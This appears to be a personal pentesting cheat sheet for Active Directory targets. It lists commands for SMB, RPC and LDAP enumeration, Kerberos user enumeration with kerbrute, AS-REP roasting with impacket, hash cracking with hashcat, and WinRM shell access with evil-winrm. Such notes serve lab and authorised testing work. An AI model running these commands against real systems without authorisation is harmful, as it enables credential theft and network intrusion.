____

```bash
crackmapexec smb $IP
```

add the domain to /etc/hosts

#  smb

```bash
smbmap -H $IP 
```

```bash
smbclient -L $IP -N
```

# rpc

```bash
rpcclient -U "" $IP -N
```

with credentials, 

```bash
rpcclient -U "user%pass" $IP -N
```

# ldap

```bash
ldapsearch -x -h $IP -s base namingcontexts
```

https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap

# kerbrute

```bash
kerbrute userenum -d domain.local --dc $IP user.txt
```


## ASREPRoast

https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#as-rep-roasting
kerbrute detect automatically

```bash
impacket-GetNPUsers domain.local/ -no-pass -usersfile users.txt
```

UF_DONT_REQUIRE_PREAUTH set

# Crack TGT

```bash
hashcat -m 18200 hash rockyou.txt
```

# WinRM

Remote Management Users

```bash
crackmapexec winrm $IP -u 'user' -p 'password'
```

```bash
evil-winrm -i $IP -u 'user' -p 'password'
```
